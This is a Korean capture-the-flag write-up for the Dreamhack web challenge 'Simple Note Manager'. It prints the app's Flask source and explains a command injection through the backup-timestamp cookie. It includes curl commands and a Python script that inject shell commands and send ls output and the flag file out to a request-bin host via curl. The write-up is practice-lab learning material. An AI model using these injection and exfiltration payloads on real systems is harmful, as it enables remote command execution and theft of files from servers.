---
title: "드림핵 lv.1 - Simple Note Manager"
date: 2025-03-11 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, command injection] 
description: 드림핵 Simple Note Manager 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/1751](https://dreamhack.io/wargame/challenges/1751)
# 문제 설명
노트를 관리하는 간단한 웹 서비스입니다.

취약점을 찾고 익스플로잇하여 플래그를 획득하세요!

플래그 형식은 DH{...} 입니다.

---
# 문제 풀이
## 웹사이트 분석
### main page
![simple note manager main](https://1drv.ms/i/c/5cb37aa515b56a00/IQTbc4AMTjNzS5-lH8ETfNTVAd99hpUwYl__yecs0wHggLk?width=660)<br />
메인 페이지에 접속해보면 기본적 CRUD 기능을 갖춘 노트 관리 서비스를 제공한다.<br />
Create으로 노트를 생성하고 생성된 노트의 인덱스로 Update 혹은 Delete가 가능하다.<br />
Backup의 기능은 지금까지 작성한 노트들을 백업하는거 같은데 백업된 파일을 어디서 보는지 알 수가 없다.
## 코드 분석
```
[Code Structure]
deploy/app/
	- templates/
	- tmp/
	- app.py
	- flag
	- requirements.txt
	- run.sh
Dockerfile
```
### app.py
```python
#!/usr/bin/env python3
import subprocess
import threading
import time
from flask import Flask, make_response, redirect, request, abort, render_template, url_for

app = Flask(__name__)

lock = threading.Lock()
new_note_id = 0
notes = {}

def create_note(content):
    global new_note_id
    with lock:
        note_id = new_note_id
        new_note_id += 1
        notes[note_id] = content
        return notes[note_id]

def read_note(note_id):
    with lock:
        return notes[note_id]

def update_note(note_id, content):
    with lock:
        notes[note_id] = content
        return notes[note_id]

def delete_note(note_id):
    with lock:
        del notes[note_id]

def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)


@app.route('/', methods=['GET'])
def get_index():
    return render_template('notes.html', notes=notes)


@app.route('/notes', methods=['GET'])
def get_notes():
    return render_template('notes.html', notes=notes)


@app.route('/create_note', methods=['GET'])
def get_create_note():
    return render_template('create_note.html')


@app.route('/create_note', methods=['POST'])
def post_create_note():
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    create_note(content)
    return redirect(url_for('get_index'))


@app.route('/update_note', methods=['GET'])
def post_update_note():
    if len(notes) == 0:
        abort(404)
    return render_template('update_note.html')


@app.route('/update_note', methods=['POST'])
def get_update_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    update_note(note_id, content)
    return redirect(url_for('get_index'))


@app.route('/delete_note', methods=['GET'])
def get_delete_note():
    if len(notes) == 0:
        abort(404)
    return render_template('delete_note.html')


@app.route('/delete_note', methods=['POST'])
def post_delete_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    delete_note(note_id)
    return redirect(url_for('get_index'))


@app.route('/backup_notes', methods=['GET'])
def get_backup_notes():
    print(len(notes), flush=True)
    if len(notes) == 0:
        abort(404)
    page = render_template('backup_notes.html')
    resp = make_response(page)
    resp.set_cookie('backup-timestamp', f'{time.time()}')
    return resp


@app.route('/backup_notes', methods=['POST'])
def post_backup_notes():
    if len(notes) == 0:
        abort(404)
    backup_timestamp = request.cookies.get('backup-timestamp', f'{time.time()}')
    if not isinstance(backup_timestamp, str):
        abort(400)
    backup_notes(backup_timestamp)
    return redirect(url_for('get_index'))
```
#### backup_notes() 
"/backup_notes" 주소에 POST 요청을 보낼 때 호출되는 함수이다. <br />
백업된 노트들이 "./tmp/notes.tmp"라는 파일에 저장되고 "/tmp/{time.time()}" 파일에도 마찬가지로 저장된다.

이때 가져오는 time.time() 값은 현재 설정된 "backup-timestamp"라는 쿠키 값에서 가져온다.<br />

해당 백업 파일이 저장되는 시각을 나타내기 위해 현재 시각을 Unix Time 값으로 파일 이름을 지정하고 있는 것이다.<br />
## 최종 풀이
### 취약점 분석
해당 서버에서는 백업 파일을 저장할 때 유저로부터 "backup-timestamp"이라는 쿠키 값을 받아와 해당 값으로 파일을 저장한다.<br />
하지만 이 쿠키 값이 올바른지 확인하는 부분이 전혀 없고 그대로 `subprocess.Popen()`에 집어넣고 있기 때문에 **Command Injection** 취약점이 발생한다.<br />

### 공격 시도
#### 첫 번째 시도
```
curl -X POST http://host3.dreamhack.games:12336/backup_notes --cookie "backup-timestamp=; curl -X GET 'https://csjigcr.request.dreamhack.games?result=$(ls | base64 -w0)'"
```
backup-timestamp 쿠키 값을 `"; curl -X GET 'https://csjigcr.request.dreamhack.games?result=$(ls | base64 -w0)'"`로 설정해서 dreamhack의 Request Bin으로 `ls` 명령어의 결과를 보내려는 시도였는데 작동을 하지 않는다.<br />
Request Bin에 아무것도 들어오지 않는다.
#### 두 번째 시도
```
curl -X POST http://host3.dreamhack.games:12336/backup_notes --cookie "backup-timestamp=$(curl https://uutbsux.request.dreamhack.games -d {`pwd`})"
```
이번엔 페이로드를 이렇게 작성해보니까 제대로 값이 Request Bin에 전달되기는 하나 내 터미널의 값이 넘어가서 이 방법도 안될 것 같다. <br />
`$(curl https://uutbsux.request.dreamhack.games -d {\`pwd\`})` 이 값이 서버로 넘어가서 실행이 돼야하는데 내 컴퓨터에서 실행이 된 체로 넘어가서 쓸 수가 없다.
#### 세 번째 시도
```python
import requests

url = "http://host3.dreamhack.games:12336/"
request_bin = "https://ezmvnwi.request.dreamhack.games"

cookie = {
    "backup-timestamp": f"$(curl {request_bin} -d {{`cat flag`}})"
}

resp = requests.post(url + "/backup_notes", cookies=cookie)
print(resp)
```
터미널에서 직접 curl을 사용하는 것이 먹히지 않으니 이번에는 파이썬의 requests 모듈을 이용해보았다.<br />
이렇게 하면 이 전의 시도에서 생겼던 이슈가 해결되고 Request Bin에서 플래그를 받아올 수 있게 된다.
# 배운 것
웹 서버의 결과를 바로 얻어낼 수 없고 command injection 취약점이 없을 때 사용하는 방식에 익숙하지 않은데 연습할 수 있는 기회가 됐다.
